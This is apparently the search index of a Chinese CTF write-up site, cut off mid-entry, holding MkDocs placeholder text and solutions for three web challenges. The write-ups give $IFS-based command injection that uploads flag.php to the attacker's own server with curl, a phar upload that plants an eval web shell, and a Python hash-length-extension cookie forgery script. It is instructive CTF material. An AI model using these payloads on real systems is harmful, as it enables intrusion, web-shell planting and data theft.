{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to MkDocs \u00b6 For full documentation visit mkdocs.org . Commands \u00b6 mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs help - Print this help message. Project layout \u00b6 mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files. \u4e00\u4e9b\u63d2\u4ef6\u7684\u4f7f\u7528 \u00b6 Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. import os print ( \"hello world\" ) \"\"\" Bubble sort \"\"\" def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] Lorem ipsum dolor sit amet, consectetur adipiscing elit Nulla lobortis egestas semper Curabitur elit nibh, euismod et ullamcorper at, iaculis feugiat est Vestibulum convallis sit amet nisi a tincidunt In hac habitasse platea dictumst In scelerisque nibh non dolor mollis congue sed et metus Sed egestas felis quis elit dapibus, ac aliquet turpis mattis Praesent sed risus massa Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque Nulla vel eros venenatis, imperdiet enim id, faucibus nisi \u884c\u5185\u4ee3\u7801 \u00b6 Here is some code: function pad ( v ){ return ( '0' + v ). split ( '' ). reverse (). splice ( 0 , 2 ). reverse (). join ( '' )} . The mock shebang will be treated like text here: #!js var test = 0; .","title":"Getting Started"},{"location":"#welcome-to-mkdocs","text":"For full documentation visit mkdocs.org .","title":"Welcome to MkDocs"},{"location":"#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs help - Print this help message.","title":"Commands"},{"location":"#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"},{"location":"#_1","text":"Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. import os print ( \"hello world\" ) \"\"\" Bubble sort \"\"\" def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] Lorem ipsum dolor sit amet, consectetur adipiscing elit Nulla lobortis egestas semper Curabitur elit nibh, euismod et ullamcorper at, iaculis feugiat est Vestibulum convallis sit amet nisi a tincidunt In hac habitasse platea dictumst In scelerisque nibh non dolor mollis congue sed et metus Sed egestas felis quis elit dapibus, ac aliquet turpis mattis Praesent sed risus massa Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque Nulla vel eros venenatis, imperdiet enim id, faucibus nisi","title":"\u4e00\u4e9b\u63d2\u4ef6\u7684\u4f7f\u7528"},{"location":"#_2","text":"Here is some code: function pad ( v ){ return ( '0' + v ). split ( '' ). reverse (). splice ( 0 , 2 ). reverse (). join ( '' )} . The mock shebang will be treated like text here: #!js var test = 0; .","title":"\u884c\u5185\u4ee3\u7801"},{"location":"web100/web100-1/","text":"web100-1 WriteUp \u00b6 \u6b64\u9898\u662f\u5168\u56fd\u5927\u5b66\u751fCTF\u8054\u8d5b\u7684\u771f\u9898 \u00b6 \u5bf9\u4e8e\u9898\u76ee\u7684\u524d\u534a\u6bb5\uff1anum\u4e2d\u4e0d\u542b1\u5374\u503c\u7b49\u4e8e1\uff1a $num=0.9999999999999999999999999999999999999999999999 \u5229\u7528\u6d6e\u70b9\u6570\u7cbe\u5ea6\u7ed5\u8fc7 \u89e3\u9898\u5173\u952e\u4e3b\u8981\u770b\u9898\u76ee\u7684\u540e\u534a\u6bb5 system(curl$cmd/flag); \u8bfb\u9898\u53ef\u4ee5\u77e5\u9053$cmd\u4e0d\u5141\u8bb8\u5b58\u5728\u7a7a\u683c\uff0c\u8981\u8bfb\u53d6\u6587\u4ef6,\u5fc5\u987b\u8981\u6784\u9020\u4e00\u4e2a\u7a7a\u683c\u51fa\u6765\u3002 \u5229\u7528Shell \u811a\u672c\u4e2d\u6709\u4e2a\u53d8\u91cf\u53ebIFS(Internal Field Seprator \u5185\u90e8\u57df\u5206\u9694\u7b26) $IFS\u76f8\u5173\uff1a \u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u201cecho $IFS | od -b\u201d\u67e5\u770b\u4e00\u4e0bIFS\u7684\u5185\u5bb9\uff1a $ echo \"$IFS\" | od -b 0000000 040 011 012 012 0000004 \u5176\u4e2d\"040\"\u662f\" \"\uff0c\"011\"\u662f\"\\t\"\uff0c\"012\"\u662f\"\\n\"\uff0c\u6700\u540e\u4e00\u4e2a\"012\"\u662f\u6267\u884cecho\u547d\u4ee4\u7684\u65f6\u5019\u52a0\u4e0a\u7684 \u6700\u540e $cmd=$IFS\\file:///$PWD/flag.php \u6216\u8005 $cmd=$IFS\\file:///var/www/html/exam/flag.php$IFS\\ $cmd=$IFS\"file:///$PWD/\" $cmd=curl -T flag.php http://\u81ea\u5df1\u7684\u670d\u52a1\u5668/getflag.php < ./flag.php getflag.php <?php $db = new mysqli('localhost', 'root', 'root', 'getflag'); $t = file_get_contents('php://input'); $db->query(\"INSERT INTO `getflag` (`flag`) VALUES('{$t}')\"); ?> \u6211\u53d1\u73b0\u7684:$cmd=$IFS\\-x$IFS\\wonderkun.cc$IFS\\-T$IFS\\flag.php$IFS\\http \u53e6\u4e00\u79cd\u505a\u6cd5\u53ef\u4ee5\u7ed5\u8fc7\u8fc7\u6ee4 : ?num=0.99999999999999999&cmd=$1%09file://$PWD/getflag.php%0a1 \u8fd8\u6709\u518d\u6765\u4e00\u79cd\u505a\u6cd5 : ?num=0.99999999999999999&cmd=0%0als%0a0 ?num=0.99999999999999999&cmd=0%0acat<getflag.php%0a0","title":"web100-1"},{"location":"web100/web100-1/#web100-1-writeup","text":"","title":"web100-1 WriteUp"},{"location":"web100/web100-1/#ctf","text":"\u5bf9\u4e8e\u9898\u76ee\u7684\u524d\u534a\u6bb5\uff1anum\u4e2d\u4e0d\u542b1\u5374\u503c\u7b49\u4e8e1\uff1a $num=0.9999999999999999999999999999999999999999999999 \u5229\u7528\u6d6e\u70b9\u6570\u7cbe\u5ea6\u7ed5\u8fc7 \u89e3\u9898\u5173\u952e\u4e3b\u8981\u770b\u9898\u76ee\u7684\u540e\u534a\u6bb5 system(curl$cmd/flag); \u8bfb\u9898\u53ef\u4ee5\u77e5\u9053$cmd\u4e0d\u5141\u8bb8\u5b58\u5728\u7a7a\u683c\uff0c\u8981\u8bfb\u53d6\u6587\u4ef6,\u5fc5\u987b\u8981\u6784\u9020\u4e00\u4e2a\u7a7a\u683c\u51fa\u6765\u3002 \u5229\u7528Shell \u811a\u672c\u4e2d\u6709\u4e2a\u53d8\u91cf\u53ebIFS(Internal Field Seprator \u5185\u90e8\u57df\u5206\u9694\u7b26) $IFS\u76f8\u5173\uff1a \u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u201cecho $IFS | od -b\u201d\u67e5\u770b\u4e00\u4e0bIFS\u7684\u5185\u5bb9\uff1a $ echo \"$IFS\" | od -b 0000000 040 011 012 012 0000004 \u5176\u4e2d\"040\"\u662f\" \"\uff0c\"011\"\u662f\"\\t\"\uff0c\"012\"\u662f\"\\n\"\uff0c\u6700\u540e\u4e00\u4e2a\"012\"\u662f\u6267\u884cecho\u547d\u4ee4\u7684\u65f6\u5019\u52a0\u4e0a\u7684 \u6700\u540e $cmd=$IFS\\file:///$PWD/flag.php \u6216\u8005 $cmd=$IFS\\file:///var/www/html/exam/flag.php$IFS\\ $cmd=$IFS\"file:///$PWD/\" $cmd=curl -T flag.php http://\u81ea\u5df1\u7684\u670d\u52a1\u5668/getflag.php < ./flag.php getflag.php <?php $db = new mysqli('localhost', 'root', 'root', 'getflag'); $t = file_get_contents('php://input'); $db->query(\"INSERT INTO `getflag` (`flag`) VALUES('{$t}')\"); ?> \u6211\u53d1\u73b0\u7684:$cmd=$IFS\\-x$IFS\\wonderkun.cc$IFS\\-T$IFS\\flag.php$IFS\\http \u53e6\u4e00\u79cd\u505a\u6cd5\u53ef\u4ee5\u7ed5\u8fc7\u8fc7\u6ee4 : ?num=0.99999999999999999&cmd=$1%09file://$PWD/getflag.php%0a1 \u8fd8\u6709\u518d\u6765\u4e00\u79cd\u505a\u6cd5 : ?num=0.99999999999999999&cmd=0%0als%0a0 ?num=0.99999999999999999&cmd=0%0acat<getflag.php%0a0","title":"\u6b64\u9898\u662f\u5168\u56fd\u5927\u5b66\u751fCTF\u8054\u8d5b\u7684\u771f\u9898"},{"location":"web100/web100-2/","text":"web100-2 WriteUp \u00b6 include.php \u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e \u53ef\u4ee5\u4f7f\u7528 include.php?file=php://filter/read=convert.base64-encode/resource=upload \u6765\u8bfb\u53d6\u6e90\u7801. \u4f46\u662f include.php \u9650\u5236\u4e86\u540e\u7f00\u53ea\u80fd\u662f .php,\u8fd9\u91cc\u8fd8\u4e0d\u80fd\u622a\u65ad \u518d\u770bupload.php,\u9650\u5236\u4e86\u53ea\u80fd\u4e0a\u4f20\u56fe\u7247 \u8fd9\u91cc\u552f\u4e00\u53ef\u7528\u7684\u5c31\u662f phar://\u8fd9\u4e2a\u534f\u8bae\u4e86 \u8fd9\u4e2a\u534f\u8bae\u5230\u5e95\u600e\u4e48\u7528\u53c2\u770b\u8fd9\u91cc: https://segmentfault.com/a/1190000002166235 http://www.mamicode.com/info-detail-888559.html \u65b9\u6cd5\u4e00 \u00b6 \u6765\u65b0\u5efa\u4e00\u4e2a\u76ee\u5f55,\u540d\u5b57\u4e3ablog,\u4e0b\u9762\u653e\u4e00\u4e2aindex.php,\u91cc\u9762\u662f\u4e00\u4e2a\u5199shell\u7684php\u4ee3\u7801 <?php file_put_contents ( 'shell.php' , '<?php eval($_POST[1])?>' ); ?> \u5728blog\u76ee\u5f55\u5916\u521b\u5efa\u4e00\u4e2a\u6253\u5305\u7684\u6587\u4ef6,build.php,\u4ee3\u7801\u5982\u4e0b: <?php if ( class_exists ( 'Phar' )){ $phar = new Phar ( 'blog.phar' , 0 , 'blog.phar' ); $phar -> buildFromDirectory ( __DIR__ . '/blog' ); $phar -> setStub ( $phar -> createDefaultStub ( 'index.php' )); $phar -> compressFiles ( Phar :: GZ ); } \u8fd0\u884cbuild.php,\u5c31\u4f1a\u521b\u5efa\u4e00\u4e2ablog.phar, \u7136\u540e\u628a\u540e\u7f00\u540d\u4fee\u6539\u4e3a blog.jpg,\u7136\u540e\u4e0a\u4f20: \u7136\u540e\u8bbf\u95ee: /include.php?file=phar://upload/blog.jpg/index \u5c31\u4f1a\u5728\u8ddf\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2ashell.php,\u6ce8\u610f.. \u4e0d\u662fupload\u76ee\u5f55\u4e0b \u65b9\u6cd5\u4e8c \u00b6 \u76f4\u63a5\u628aindex.php zip\u538b\u7f29\u4e3a blog.zip ,\u7136\u540e\u6539\u540d\u5b57\u4e3a blog.jpg, \u4e0a\u4f20\u4e4b\u540e,\u7528\u540c\u6837\u7684\u65b9\u6cd5,\u4e5f\u53ef\u4ee5getshell \u65b9\u6cd5\u4e09 \u00b6 ZIP\u4f2a\u534f\u8bae\u4e5f\u53ef\u7ed5\u8fc7","title":"web100-2"},{"location":"web100/web100-2/#web100-2-writeup","text":"include.php \u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e \u53ef\u4ee5\u4f7f\u7528 include.php?file=php://filter/read=convert.base64-encode/resource=upload \u6765\u8bfb\u53d6\u6e90\u7801. \u4f46\u662f include.php \u9650\u5236\u4e86\u540e\u7f00\u53ea\u80fd\u662f .php,\u8fd9\u91cc\u8fd8\u4e0d\u80fd\u622a\u65ad \u518d\u770bupload.php,\u9650\u5236\u4e86\u53ea\u80fd\u4e0a\u4f20\u56fe\u7247 \u8fd9\u91cc\u552f\u4e00\u53ef\u7528\u7684\u5c31\u662f phar://\u8fd9\u4e2a\u534f\u8bae\u4e86 \u8fd9\u4e2a\u534f\u8bae\u5230\u5e95\u600e\u4e48\u7528\u53c2\u770b\u8fd9\u91cc: https://segmentfault.com/a/1190000002166235 http://www.mamicode.com/info-detail-888559.html","title":"web100-2 WriteUp"},{"location":"web100/web100-2/#_1","text":"\u6765\u65b0\u5efa\u4e00\u4e2a\u76ee\u5f55,\u540d\u5b57\u4e3ablog,\u4e0b\u9762\u653e\u4e00\u4e2aindex.php,\u91cc\u9762\u662f\u4e00\u4e2a\u5199shell\u7684php\u4ee3\u7801 <?php file_put_contents ( 'shell.php' , '<?php eval($_POST[1])?>' ); ?> \u5728blog\u76ee\u5f55\u5916\u521b\u5efa\u4e00\u4e2a\u6253\u5305\u7684\u6587\u4ef6,build.php,\u4ee3\u7801\u5982\u4e0b: <?php if ( class_exists ( 'Phar' )){ $phar = new Phar ( 'blog.phar' , 0 , 'blog.phar' ); $phar -> buildFromDirectory ( __DIR__ . '/blog' ); $phar -> setStub ( $phar -> createDefaultStub ( 'index.php' )); $phar -> compressFiles ( Phar :: GZ ); } \u8fd0\u884cbuild.php,\u5c31\u4f1a\u521b\u5efa\u4e00\u4e2ablog.phar, \u7136\u540e\u628a\u540e\u7f00\u540d\u4fee\u6539\u4e3a blog.jpg,\u7136\u540e\u4e0a\u4f20: \u7136\u540e\u8bbf\u95ee: /include.php?file=phar://upload/blog.jpg/index \u5c31\u4f1a\u5728\u8ddf\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2ashell.php,\u6ce8\u610f.. \u4e0d\u662fupload\u76ee\u5f55\u4e0b","title":"\u65b9\u6cd5\u4e00"},{"location":"web100/web100-2/#_2","text":"\u76f4\u63a5\u628aindex.php zip\u538b\u7f29\u4e3a blog.zip ,\u7136\u540e\u6539\u540d\u5b57\u4e3a blog.jpg, \u4e0a\u4f20\u4e4b\u540e,\u7528\u540c\u6837\u7684\u65b9\u6cd5,\u4e5f\u53ef\u4ee5getshell","title":"\u65b9\u6cd5\u4e8c"},{"location":"web100/web100-2/#_3","text":"ZIP\u4f2a\u534f\u8bae\u4e5f\u53ef\u7ed5\u8fc7","title":"\u65b9\u6cd5\u4e09"},{"location":"web300/web300-1/","text":"web300-1 writeup \u00b6 \u5728 www.tar.gz \u4e0b\u8f7d\u5230\u6e90\u7801,\u8fdb\u884c\u5ba1\u8ba1: \u53d1\u73b0flag\u5df2\u7ecf\u52a0\u5bc6\u4e86 require_once('encrypt.php'); file_put_contents('./backup.txt', token_encrypt(file_get_contents('./flag.txt'))); \u7531\u4e8e\u4e0d\u77e5\u9053key,\u6240\u4ee5\u8981\u60f3\u89e3\u5bc6\u9700\u8981\u7528\u7ba1\u7406\u5458\u8eab\u4efd: if ($admin) { $text = ''; if (isset($_POST['do'])) { switch ($_POST['do']) { case 'encrypt': $text = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, get_key(), hex2bin($_POST['text']), MCRYPT_MODE_CFB, hex2bin($_POST['iv']))); break; case 'decrypt': $text = bin2hex(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, get_key(), hex2bin($_POST['text']), MCRYPT_MODE_CFB, hex2bin($_POST['iv']))); break; } } } \u6240\u4ee5\u601d\u8def\u662f\u7528\u91cd\u653e\u653b\u51fb\u6765\u4f2a\u9020\u7ba1\u7406\u5458\u8eab\u4efd. \u6ce8\u518c\u4e00\u4e2a\u7528\u6237\u540d\u4e3a $user|1|$hash \u7684\u8d26\u53f7,\u7136\u540e\u7528\u5b83\u7684\u8eab\u4efd\u767b\u9646(\u767b\u9646\u4e0d\u4f1a\u6210\u529f),\u4f46\u662f\u4f1a\u4ea7\u751fcookie.\u622a\u53d6cookie\u5408\u9002\u7684\u957f\u5ea6,\u5f97\u5230 $user|1|$hash \u7684\u52a0\u5bc6\u7ed3\u679c,\u4f2a\u9020\u7ba1\u7406\u5458\u8eab\u4efd. \u4f46\u662f $user|1|$hash \u4e2d\u7684 $hash \u6ca1\u6709\u529e\u6cd5\u77e5\u9053,\u5e76\u4e14\u5728\u767b\u9646\u7684\u65f6\u5019\u505a\u4e86\u9a8c\u8bc1. if (isset($_COOKIE['token'])&&isset($_COOKIE['sign'])) { $sign = $_COOKIE['sign']; $token = $_COOKIE['token']; $arr = explode('|', token_decrypt($token)); if (count($arr) == 3) { if (md5(get_indentify().$arr[0]) === $arr[2] && $sign === $arr[2]) { $user = $arr[0]; $admin = (int)$arr[1]; } } } \u6765\u770b sign \u548c token \u7684\u4ea7\u751f\u8fc7\u7a0b: $user = $_POST['user']; // get_indentify() \u83b7\u53d610\u4f4d\u7684key,\u505a\u4e00\u4e2a\u8eab\u4efd\u7b7e\u540d,\u9632\u6b62\u8eab\u4efd\u4f2a\u9020 $md5 = md5(get_indentify().$user); $admin = 0; // $token = token_encrypt(\"$user|$admin|$md5\"); $token = token_encrypt(\"$user|$admin|$md5\"); setcookie('sign',$md5,time()+5*60,\"/\",'',false,true); setcookie('token',$token,time()+5*60,\"/\",'',false,true); \u6839\u636e $sign = md5(get_indentify().$user) \u77e5\u9053,\u8fd9\u91cc$sign\u53ef\u4ee5\u7528hash\u957f\u5ea6\u6269\u5c55\u653b\u51fb, \u5e76\u4e14\u6839\u636e\u6ce8\u91ca\u77e5\u9053\u524d\u7f00\u662f10\u4f4d\u7684. \u518d\u6784\u9020\u7528\u6237\u540d\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f,\u56e0\u4e3a\u5728\u52a0\u5bc6\u524d\u8fdb\u884c\u4e86\u4f4d\u6269\u5c55 function pad($str) { return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS)); } \u4e0d\u662f16\u5b57\u8282\u7684\u500d\u6570,\u5c31\u8865\u591f16\u7684\u5b57\u8282\u7684\u500d\u6570,\u5982\u679c\u662f16\u5b57\u8282\u7684\u500d\u6570,\u5c31\u4f1a\u5728\u540e\u9762\u518d\u52a016\u5b57\u8282,\u8fd9\u91cc\u6784\u9020\u7684\u7528\u6237\u540d\u4e0d\u5e94\u8be5\u662f16\u5b57\u8282\u7684\u6574\u6570\u500d,\u800c\u5e94\u8be5\u662f16\u5b57\u8282\u7684\u500d\u6570\u51cf1\u4f4d. \u56e0\u4e3a\u9700\u8981hash\u6269\u5c55\u653b\u51fb,\u9700\u8981\u7684\u957f\u5ea6\u6bd4\u8f83\u591a,\u6784\u902079\u4f4d\u7684\u53ef\u80fd\u5bb9\u4e0d\u4e0bhash\u6269\u5c55\u653b\u51fb\u7684\u5197\u4f59\u5b57\u8282,\u6240\u4ee5\u6211\u8fd9\u91cc\u6784\u902095\u4f4d\u7684\u7528\u6237\u540d. \u89e3\u9898: 1. \u6ce8\u518c\u4e00\u4e2a\u7528\u6237\u540d wonderkun \u83b7\u53d6\u7b7e\u540d: ee11925035598658e4ea6364806d6796 \u7528\u6237\u540d\u662f9\u4f4d\u7684,\u9700\u8981\u6269\u5c55\u7684\u4f4d\u6570\u4e3a 95-32-3-9=51,\u6240\u4ee5\u9700\u8981\u6269\u5c5551\u4f4d, append \u7684\u6570\u636e\u968f\u610f,\u53ea\u8981\u51d1\u591f51\u4f4d\u5c31\u53ef\u4ee5 $ python md5pad.py ee11925035598658e4ea6364806d6796 tadmin 19 Payload: '\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x98\\x00\\x00\\x00\\x00\\x00\\x00\\x00tadmin' Payload urlencode: %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%00%00%00%00%00%00%00tadmin md5: fe46d7d8924ec23d69f8d01432de41aa 3. \u6240\u4ee5\u9700\u8981\u6784\u9020\u7684\u7528\u6237\u540d\u4e3a wonderkun%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%00%00%00%00%00%00%00tadmin|1|fe46d7d8924ec23d69f8d01432de41aa \u7528\u8fd9\u4e2a\u8d26\u53f7\u6ce8\u518c\u4e00\u4e2a\u7528\u6237,\u7136\u540e\u7528\u8fd9\u4e2a\u8d26\u53f7\u767b\u9646\u83b7\u53d6cookie\u7684token\u7684\u524d190\u4f4d,\u5c31\u662f\u8fd995\u7684\u52a0\u5bc6\u7ed3\u679c,\u4f46\u662f95\u4f4d\u662f\u9700\u8981\u8fdb\u884cpad\u7684,\u6269\u5c55\u4e86\u4e00\u4f4d,\u6240\u4ee5\u6700\u540e\u4e00\u4f4d\u7684\u52a0\u5bc6\u7ed3\u679c\u9700\u8981\u7206\u7834\u51fa\u6765: \u7ed9\u51fa\u4e86 python\u7684poc: #!/usr/bin/python # coding:utf-8 import requests def login (): url = \"http://127.0.0.1:4444/index.php?action=login\" data = \"user=wonderkun %80% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 98 %00% 00 %00% 00 %00% 00%00tadmin|1|fe46d7d8924ec23d69f8d01432de41aa&pwd=1\" header = { \"Content-Type\" : \"application/x-www-form-urlencoded\" } res = requests . post ( url , data = data , allow_redirects = False , proxies = { \"http\" : \"127.0.0.1:8080\" }, headers = header ) return res . cookies [ 'token' ][: 190 ] def getAdminToken ( token ): randstr = \"0123456789abcdef\" for i in randstr : for j in randstr : # token = token+i+j url = \"http://127.0.0.1:4444/index.php?action=home\" headers = { 'Cookie' : 'sign=' + 'fe46d7d8924ec23d69f8d01432de41aa' + ';' + 'token=' + token + i + j } # print url proxy = { \"http\" : \"127.0.0.1:8080\" } res = requests . get ( url , headers = headers , proxies = proxy ) if \"User\" in res . text : print \"[*] Cookie:\" , headers [ 'Cookie' ] return else : print \"[*] failed\" # print res.text if __name__ == \"__main__\" : tokenPre = login () print tokenPre getAdminToken ( tokenPre ) \u83b7\u53d6\u4e00\u4e2a\u53ef\u7528\u7684cookie,\u5c31\u53ef\u4ee5\u83b7\u53d6\u4e00\u4e2a\u7ba1\u7406\u5458\u8eab\u4efd: [*] Cookie: sign=fe46d7d8924ec23d69f8d01432de41aa;token=2a3654363a57be283fbfc6d730c55c646cfe9b1a04c1ff10aa80327828ab6ca990b95fe6a00a9f6494abb1d47321643ed79e8c6b33bb6074e91a5d5be9f92fb5933500e7859129b4dc2c3f99b7738fa4dfed60e2fc8cb34f959e4287ce53185c \u63a5\u4e0b\u6765\u83b7\u53d6 iv,\u770bbackup.txt\u7684\u65f6\u95f4, Apr 12 09:26 \u8f6c\u5316\u4e3a\u65f6\u95f4\u6233\u4e3a: 1491960409 \u83b7\u53d6 iv,\u770bbackup.txt\u7684\u65f6\u95f4, <div class=\"codehilite\"><pre><span></span>Apr 12 09:26 \u8f6c\u5316\u4e3a\u65f6\u95f4\u6233\u4e3a: 1491960409 </pre></div> \u83b7\u53d6 iv: ** \u6ce8\u610f\u8fd9\u91cc\u8981\u752864\u7684linux\u64cd\u4f5c\u7cfb\u7edf\u4ea7\u751f iv,windows\u548clinux\u4ea7\u751f\u7684\u968f\u673a\u5e8f\u5217\u662f\u4e0d\u4e00\u6837\u7684 ** function getRandChar($length){ $str = null; $strPol = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz\"; for($i=0;$i<$length;$i++){ $n = rand(0, strlen($strPol) - 1); $str.=$strPol[$n]; } return $str; } srand( 1491960409/ 300); $iv = getRandChar(16); echo bin2hex($iv); echo \"\\n\"; \u83b7\u53d6$iv = 6f39784745597a644b52354a50497976 \u7136\u540e\u89e3\u5bc6:backup.txt\u7684\u5185\u5bb9: \u5f97\u5230flag: flag{660b7b8c06e3150d174a3ec9fcd7ab9d} \u522b\u7684\u89e3\u9898\u601d\u8def\u7684wp \u00b6 [*] chamd5\u5b89\u5168\u56e2\u961f [*] \u58a8\u9e92\u9e9f\u5b89\u5168\u5b9e\u9a8c","title":"web300-1"},{"location":"web300/web300-1/#web300-1-writeup","text":"\u5728 www.tar.gz \u4e0b\u8f7d\u5230\u6e90\u7801,\u8fdb\u884c\u5ba1\u8ba1: \u53d1\u73b0flag\u5df2\u7ecf\u52a0\u5bc6\u4e86 require_once('encrypt.php'); file_put_contents('./backup.txt', token_encrypt(file_get_contents('./flag.txt'))); \u7531\u4e8e\u4e0d\u77e5\u9053key,\u6240\u4ee5\u8981\u60f3\u89e3\u5bc6\u9700\u8981\u7528\u7ba1\u7406\u5458\u8eab\u4efd: if ($admin) { $text = ''; if (isset($_POST['do'])) { switch ($_POST['do']) { case 'encrypt': $text = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, get_key(), hex2bin($_POST['text']), MCRYPT_MODE_CFB, hex2bin($_POST['iv']))); break; case 'decrypt': $text = bin2hex(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, get_key(), hex2bin($_POST['text']), MCRYPT_MODE_CFB, hex2bin($_POST['iv']))); break; } } } \u6240\u4ee5\u601d\u8def\u662f\u7528\u91cd\u653e\u653b\u51fb\u6765\u4f2a\u9020\u7ba1\u7406\u5458\u8eab\u4efd. \u6ce8\u518c\u4e00\u4e2a\u7528\u6237\u540d\u4e3a $user|1|$hash \u7684\u8d26\u53f7,\u7136\u540e\u7528\u5b83\u7684\u8eab\u4efd\u767b\u9646(\u767b\u9646\u4e0d\u4f1a\u6210\u529f),\u4f46\u662f\u4f1a\u4ea7\u751fcookie.\u622a\u53d6cookie\u5408\u9002\u7684\u957f\u5ea6,\u5f97\u5230 $user|1|$hash \u7684\u52a0\u5bc6\u7ed3\u679c,\u4f2a\u9020\u7ba1\u7406\u5458\u8eab\u4efd. \u4f46\u662f $user|1|$hash \u4e2d\u7684 $hash \u6ca1\u6709\u529e\u6cd5\u77e5\u9053,\u5e76\u4e14\u5728\u767b\u9646\u7684\u65f6\u5019\u505a\u4e86\u9a8c\u8bc1. if (isset($_COOKIE['token'])&&isset($_COOKIE['sign'])) { $sign = $_COOKIE['sign']; $token = $_COOKIE['token']; $arr = explode('|', token_decrypt($token)); if (count($arr) == 3) { if (md5(get_indentify().$arr[0]) === $arr[2] && $sign === $arr[2]) { $user = $arr[0]; $admin = (int)$arr[1]; } } } \u6765\u770b sign \u548c token \u7684\u4ea7\u751f\u8fc7\u7a0b: $user = $_POST['user']; // get_indentify() \u83b7\u53d610\u4f4d\u7684key,\u505a\u4e00\u4e2a\u8eab\u4efd\u7b7e\u540d,\u9632\u6b62\u8eab\u4efd\u4f2a\u9020 $md5 = md5(get_indentify().$user); $admin = 0; // $token = token_encrypt(\"$user|$admin|$md5\"); $token = token_encrypt(\"$user|$admin|$md5\"); setcookie('sign',$md5,time()+5*60,\"/\",'',false,true); setcookie('token',$token,time()+5*60,\"/\",'',false,true); \u6839\u636e $sign = md5(get_indentify().$user) \u77e5\u9053,\u8fd9\u91cc$sign\u53ef\u4ee5\u7528hash\u957f\u5ea6\u6269\u5c55\u653b\u51fb, \u5e76\u4e14\u6839\u636e\u6ce8\u91ca\u77e5\u9053\u524d\u7f00\u662f10\u4f4d\u7684. \u518d\u6784\u9020\u7528\u6237\u540d\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f,\u56e0\u4e3a\u5728\u52a0\u5bc6\u524d\u8fdb\u884c\u4e86\u4f4d\u6269\u5c55 function pad($str) { return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS)); } \u4e0d\u662f16\u5b57\u8282\u7684\u500d\u6570,\u5c31\u8865\u591f16\u7684\u5b57\u8282\u7684\u500d\u6570,\u5982\u679c\u662f16\u5b57\u8282\u7684\u500d\u6570,\u5c31\u4f1a\u5728\u540e\u9762\u518d\u52a016\u5b57\u8282,\u8fd9\u91cc\u6784\u9020\u7684\u7528\u6237\u540d\u4e0d\u5e94\u8be5\u662f16\u5b57\u8282\u7684\u6574\u6570\u500d,\u800c\u5e94\u8be5\u662f16\u5b57\u8282\u7684\u500d\u6570\u51cf1\u4f4d. \u56e0\u4e3a\u9700\u8981hash\u6269\u5c55\u653b\u51fb,\u9700\u8981\u7684\u957f\u5ea6\u6bd4\u8f83\u591a,\u6784\u902079\u4f4d\u7684\u53ef\u80fd\u5bb9\u4e0d\u4e0bhash\u6269\u5c55\u653b\u51fb\u7684\u5197\u4f59\u5b57\u8282,\u6240\u4ee5\u6211\u8fd9\u91cc\u6784\u902095\u4f4d\u7684\u7528\u6237\u540d. \u89e3\u9898: 1. \u6ce8\u518c\u4e00\u4e2a\u7528\u6237\u540d wonderkun \u83b7\u53d6\u7b7e\u540d: ee11925035598658e4ea6364806d6796 \u7528\u6237\u540d\u662f9\u4f4d\u7684,\u9700\u8981\u6269\u5c55\u7684\u4f4d\u6570\u4e3a 95-32-3-9=51,\u6240\u4ee5\u9700\u8981\u6269\u5c5551\u4f4d, append \u7684\u6570\u636e\u968f\u610f,\u53ea\u8981\u51d1\u591f51\u4f4d\u5c31\u53ef\u4ee5 $ python md5pad.py ee11925035598658e4ea6364806d6796 tadmin 19 Payload: 